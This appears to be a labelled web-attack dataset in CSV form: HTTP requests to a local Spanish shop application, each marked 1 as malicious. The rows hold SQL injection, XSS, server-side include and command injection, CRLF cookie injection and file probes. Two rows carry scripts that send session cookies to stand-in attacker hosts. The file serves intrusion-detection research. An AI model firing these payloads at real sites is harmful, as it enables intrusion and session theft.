,request,label
66,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sundar&pwda=respetosa&remember=on&b1=entrar,1
67,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=rasmiraany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&apellidos=pavi�+pool&email=gloves@sms24h.mk&dni=92795576y&direccion=calle+jose+luis+de+arrese,+105+1?f&ciudad=ger&cp=24370&provincia=cantabria&ntc=7563981891605435&b1=registrar",1
68,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=skipp&pwd=bra3o&remember=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&b1=entrar,1
69,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1/&nombre=vino+rioja&precio=100&cantidad=36&b1=a�adir+al+carrito,1
70,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heunis&pwd=82m13&remember=on&b1=entrarand+1=1,1
71,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=<!--#include+file=""archivo_secreto""+-->&password=pirr7n108&nombre=siro&apellidos=casaramon+tetatzin&email=malcolm_motaung@enlanzarote.com.yu&dni=30635705g&direccion=cristo+rey,+59,+2b&ciudad=arenales+de+san+gregorio&cp=24745&provincia=huelva&ntc=2796424278292099&b1=registrar",1
72,gethttp://localhost:8080/iisadmpwd/aexp2b.htr,1
73,gethttp://localhost:8080/tienda1/publico/productos.jsp/,1
74,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8409&b1=pasar+por+caja/,1
75,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rosalyn&password=0m84n750&nombre=jeannette+amelie&apellidos=esguevillas+abizanda&email=janda@sayuela.aw&dni=04452062k&direccion=calle+carassa+117,+&ciudad=galinduste&cp=16268&provinciaa=a+coru�a&ntc=8900090922020406&b1=registrar",1
76,gethttp://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide.gif/,1
77,gethttp://localhost:8080/tienda1/global/creditos.jsp.old,1
78,gethttp://localhost:8080/webapp/examples/simple.jsp,1
79,gethttp://localhost:8080/scripts/tools/drvrs.exe,1
80,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5175&b1=pasar+por+caja/,1
81,gethttp://localhost:8080/_vti_bin/_vti_aut/author.dll,1
82,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=5151&b1=confirmar,1
83,gethttp://localhost:8080/exampleswebapp/ejbeanmanagedclient.jsp,1
84,gethttp://localhost:8080/tienda1/publico/registro.jsp/6909030637832563290.jsp,1
85,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%00,1
86,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=frederiq&password=carian?cha&nombre=refael&apellidos=san+-felipe+serv,itje&email=taylor-young@esposa.com.mu&dni=78433382r&direccion=calle+jose+maria+casta�o+16+&ciudad=villores&cp=49740&provincia=cuenca&ntc=1302864745707102&b1=registrar",1
87,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lerch&password=5elas2omat�2eo&nombre=alcira&apellidos=forn�s+kohls&email=busch@show.nom.naany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&dni=71246547e&direccion=francisco+ni�o,+100+&ciudad=marazoleja&cp=19144&provincia=valladolid&ntc=2373775613776198&b1=registrar",1
88,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235,1
89,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=');waitfor+delay+'0:0:15';--&nombre=vino+rioja&precio=39&cantidad=6&b1=a�adir+al+carrito,1
90,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=haylock&password=zangarull�n&nombre=a/m/i?r&apellidos=acevedo+cantonati&email=kuzuoglu5@nomao.iq&dni=43751597p&direccion=c/+maria+moliner+48+&ciudad=ojos+negros&cp=10160&provincia=salamanca&ntc=0358024000873525&b1=registrar,1
91,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
92,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9345&b1=pasar+por+caja/,1
93,gethttp://localhost:8080/catalog.nsf,1
94,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
95,gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.old,1
96,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=75&b1a=a�adir+al+carrito,1
97,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rosalyn&password=0m84n750&nombre=jeannette+amelie&apellidos=esguevillas+abizanda&email=janda@sayuela.aw&dni=04452062k&direccion=calle+carassa+117,+&ciudad=galinduste&cp=16268&provincia=a+coru�a&ntc=%00&b1=registrar",1
98,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9594&b1=pasar+por+caja/,1
99,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=dulio&apellidos=ubach+rodr�guez&email=wilmot@schnaps.com.ne&dni=87584326g&direccion=c/+lara,+162+&ciudad=villanueva+de+campe�n&cp=""+and+""1""=""1&provincia=barcelona&ntc=5124736256894307&b1=registrar",1
100,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=deng-jyi&pwd=f�mula&remember=on&b1a=entrar,1
101,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heinonen&pwd=s+oso&remember=off/&b1=entrar,1
102,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9085bob@<script>alert(paros)</script>.parosproxy.org&b1=pasar+por+caja,1
103,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
104,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mariaele&passworda=clerofobia&nombre=royce&apellidos=cornetero+siruela&email=jager@tresbrujas.hr&dni=41502558r&direccion=calle+pico+mampodre+106,+&ciudad=alhama+de+arag�n&cp=01439&provincia=barcelona&ntc=6736665084880306&b1=registrar",1
105,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
106,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3f,1
107,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nyberg&password=predicha&nombre=carmina&apellidos=serarols+ginesta<!--#include+file=""archivo_secreto""+-->&email=redford2@enlanzarote.com.cz&dni=80243620r&direccion=zumel+s/n,+&ciudad=mas+de+barberans&cp=05420&provincia=zamora&ntc=5782200649154235&b1=registrar",1
108,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=+,1
109,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=9805&b1=pasar+por+caja,1
110,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85&cantidad=76""><!--#exec+cmd=""dir+""--><&b1=a�adir+al+carrito",1
111,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235,1
112,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1/&nombre=vino+rioja&precio=100&cantidad=45&b1=a�adir+al+carrito,1
113,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
114,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrarparos%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&login=odele&pwd=19ler8z6r&remember=on&b1=entrar,1
115,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=84&b1a=a�adir+al+carrito,1
116,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ircbellc&password=c6ma2&nombre=macarena&apellidos=raynal+santini&email=vesota@autoescuelavilla.fm&dni=87351797m&direccion=calle+lachambre+dominguez,+27,+13?d&ciudada=alcal�+de+xivert&cp=39212&provincia=sevilla&ntc=9974355200418178&b1=registrar",1
117,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dirk&password=8d0n23&nombre=<script>alert(""paros"");</script>&apellidos=caparr�s+bujan&email=bunnag@djbroadcast.me&dni=05409515f&direccion=calle+incas,+159,+5?a&ciudad=busturia&cp=29410&provincia=le�n&ntc=9280136087068381&b1=registrar",1
118,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
119,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5863&b1=pasar+por+caja/,1
120,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pubs&password=misa9tr�pica&nombre=juana+del+pilar&apellidos=arias+salavedra&email=keefer-claudio@hipermadrid.kr&dni=24987514s&direccion=nucleo+residencial+san+carlos,+5,+3?h&ciudad=alba+de+tormes&cp=22896&provincia=castell�n&ntca=2643686847847582&b1=registrar",1
121,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bjorklun""+and+""1""=""1&pwd=4n013mo4i2&remember=on&b1=entrar",1
122,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gallard&password=c36ba&nombre=federica&apellidos=corb�+pichunman&email=pankin@muevetuweb.mobi&dni=49680817n%00&direccion=calle+zapateria+vieja+71+8d&ciudad=romanillos+de+atienza&cp=03579&provincia=tarragona&ntc=2469234767327968&b1=registrar,1
123,gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg/asf-logo-wide.gif.inc,1
124,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=reiman""+and+""1""=""1&pwd=7asto&remember=off&b1=entrar",1
125,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
126,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=surreau&password='!fabl,ad/a&nombre=najla&apellidos=matamalas+reixachs&email=egger.nardo@quecole.sr&dni=56569418k&direccion=pl.+tres+olivos,+s/n+1-f&ciudad=ll�ber&cp=26321&provincia=guadalajara&ntc=5185081374868942&b1=registrar",1
127,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=810&b1=confirmar/,1
128,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%3f,1
129,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=853&b1='+and+'1'='1,1
130,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=672&b1=confirmar,1
131,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
132,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=erdem&password=verd7ma3&nombre=zinedine&apellidos=terzano+revert�&email=%7c&dni=58018464k&direccion=c/+alondra,+134,+10?c&ciudad=pu�rtolas&cp=33070&provincia=guadalajara&ntc=4378749164701036&b1=registrar",1
133,gethttp://localhost:8080/tienda1/imagenes/4861362529278789730.inc,1
134,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ketan&pwd=reng1era','0');waitfor+delay+'0:0:15';--&remember=off&b1=entrar",1
135,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
136,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9350&b1=|,1
137,gethttp://localhost:8080/iisadmpwd/anot3.htr,1
138,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schloboh&password=e229dado&nombre=""+and+""1""=""1&apellidos=cresp�+zarzosa&email=lune-dulier@natravea.py&dni=51098953z&direccion=av.+pedro+mata,+s/n+8?f&ciudad=ataun&cp=24367&provincia=�vila&ntc=2333052430103872&b1=registrar",1
139,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=berenice&pwd=enfeudaci�n&remember=off/&b1=entrar,1
140,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
141,gethttp://localhost:8080.old,1
142,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registroand+1=1&login=waytowic&password=engargolar&nombre=renato&apellidos=membrives+larragoiti&email=alvarez_barwick@906.com.tv&dni=61170907s&direccion=c/+max+aub+121+9-a&ciudad=cill�n&cp=20213&provincia=�vila&ntc=0093197595343977&b1=registrar,1
143,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoany%0aset-cookie%3a+tamper%3d1041264011025374727,1
144,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=onyshko&password=r8sp3ct6v4&nombre=safira&apellidos=pelegay+martinho&email=brisbane@drae2.at&dnia=89692486f&direccion=c/+baladre+195,+10-c&ciudad=zamay�n&cp=22415&provincia=las+palmas&ntc=4857920544349318&b1=registrar",1
145,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thege&password=abstruso&nombre=guida&apellidos=lambarri&email=mcclellan.truex@faders.com.cl&dni=62140654j&direccion=txapitela,+183+13?g&ciudad=man+tin*os&cp=04569&provincia=toledo&ntc=1284694854341650&b1=registrar",1
146,gethttp://localhost:8080/tienda1/publico/anadir.jsp~,1
147,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ettridge&pwd=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&remember=on&b1=entrar,1
148,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif/.bak,1
149,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1+&nombre=queso+manchego&precio=39&cantidad=15&b1=a�adir+al+carrito,1
150,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=absi&password=primogenitura&nombre=sem&apellidos=bettini&email=phillott@g-audio.cf&dni=88374981b&direccion=calle+zubia+7+&ciudad=gar�noain&cp=10189&provincia=lleida&ntc=0957957573117060&b1=sessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?,1
151,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
152,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ramnarin&password=o14ula2o&nombre=fedelia&apellidos=badia+m�nico&email=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&dni=34742926t&direccion=c/+felipe+oya+rodriguez+56+12f&ciudad=navalilla&cp=07048&provincia=palencia&ntc=2677666876528376&b1=registrar,1
153,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yarosh&password=5,7/7medi2r&nombre=ian&apellidos=bardina+servi�&email=alissa_macmillian@soyandaluz.sl&dni=28316047b&direccion=avda.+conde+de+halcon,+127+7?a&ciudad=moral+de+la+reina&cp=49311&provincia=lleida&ntc=9933609390542119&b1=registrar",1
154,gethttp://localhost:8080/tienda1/global.java,1
155,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas?,1
156,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chapdela&password=sacar*ificaci�n&nombre=gali&apellidosa=pi�eriro+celayes&email=macgowan@comerciosdeaspe.kr&dni=47913001e&direccion=c/+virgen+de+la+esperanza+s/n,+9-b&ciudad=espadilla&cp=25791&provincia=ciudad+real&ntc=8410049060666952&b1=registrar",1
157,gethttp://localhost:8080/tienda1/publico/anadir.jsp.old,1
158,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5781&b1=pasar+por+caja/,1
159,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=snuggs&password=recie.nte&nombre=caritian&apellidos=celaya+gaytan&email=yarbrough@ingenieriadela@construccion@.tk&dni=75925253e&direccion=carrer+sant+celoni+39,+8-h&ciudad=cepeda+la+mora&cp=45200&provincia=sevilla&ntc=0439326406567851&b1=registrar",1
160,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&passworda=libreta&nombre=virtudes&apellidos=t�rtola+planelles&email=arnold-weck@santcugatpisos.gl&dni=75272191e&direccion=calle+san+mambru,+60+&ciudad=guijo+de+coria&cp=23391&provincia=salamanca&ntc=7881123538069057&b1=registrar",1
161,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+.*?rioja&precio=85&cantidad=72&b1=a�adir+al+carrito,1
162,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=visvanat&password=mohatrera&nombre=helga&apellidos=peratill&email=hauser@whitepearlresort.as&dni=88363371q&direccion=calle+sandoval+135,+4?b&ciudad=s�daba&cp='+and+'1'='1&provincia=zaragoza&ntc=6865627677043866&b1=registrar",1
163,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=horatius&password=323ant5cidi3&nombre=herenia&apellidos=witron+olivares&email=ni@chols@tartasconamo@r.sj&dni=77733072h&direccion=calle+reina+regente+47+&ciudad=sotillo+del+rinc�n&cp=09460&provincia=la+rioja&ntc=7365954967805937&b1=registrar,1
164,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
165,gethttp://localhost:8080/webspheresamples/singlesamples/increment/increment.html,1
166,gethttp://localhost:8080/tienda1/publico/anadir.jsp?ida=2&nombre=vino+rioja&precio=85&cantidad=29&b1=a�adir+al+carrito,1
167,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/.inc,1
168,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio='+and+'1'='1&cantidad=85&b1=a�adir+al+carrito,1
169,gethttp://localhost:8080/tienda1/imagenes/logo.gif/.bak,1
170,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8699&b1=confirmar/,1
171,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85/&cantidad=18&b1=a�adir+al+carrito,1
172,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&login=zeigler&pwd=7ervant0f2la&remember=off&b1=entrar,1
173,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=orin&password=-picardo&nombre=abdel&apellidos=butgardon+nogueola&email=gruber_coonleu2@13horas.gd&dni=01485962r&direccion=c/+dean+zaragoza,+121,+3?f&ciudada=manzanares+de+rioja&cp=10320&provincia=tarragona&ntc=7019128691164371&b1=registrar",1
174,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidad=83&b1a=a�adir+al+carrito,1
175,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vaclav&password=p79pel7&nombre=magali&apellidos=cepa+filoteo&email=deschamps1@11horas.my&dni=57073625e&direccion=urbanizacion+arenas,+s/n+1-d&ciudad=hu�var+del+aljarafe&cp=41510&provinciaa=zaragoza&ntc=7179939900578351&b1=registrar",1
176,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%22%20style=%22background:url(javascript:alert('paros')),1
177,gethttp://localhost:8080/tienda1/imagenes/asf-logo-wide.gif,1
178,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=7095&b1=confirmar,1
179,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rogge&pwd=mella&remember=on&b1=entrar""+and+""1""=""1",1
180,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
181,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3f,1
182,gethttp://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif.old,1
183,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modoa=registro&login=carmody&password=borricalmente&nombre=lihue&apellidos=figueredo+ferr�s&email=varennes@so-tel.ni&dni=17014566v&direccion=rambla+de+mercedes+149,+&ciudad=hornillos+de+cameros&cp=23560&provincia=valladolid&ntc=7245939027120885&b1=registrar",1
184,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6500&b1a=pasar+por+caja,1
185,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dimitrio&password=a30t0na8&nombre=zelmar&apellidos=manj�n+montolio&email=lovelle.lorente@ringringrent.asia&dni=19110618x&direccion=alameda+principal,+180+&ciudad=','0','0');waitfor+delay+'0:0:15';--&cp=40291&provincia=guip�zcoa&ntc=2985545355401012&b1=registrar",1
186,gethttp://localhost:8080/catalog.nsf,1
187,puthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,1
188,gethttp://localhost:8080/tienda1/global/titulo.jsp/,1
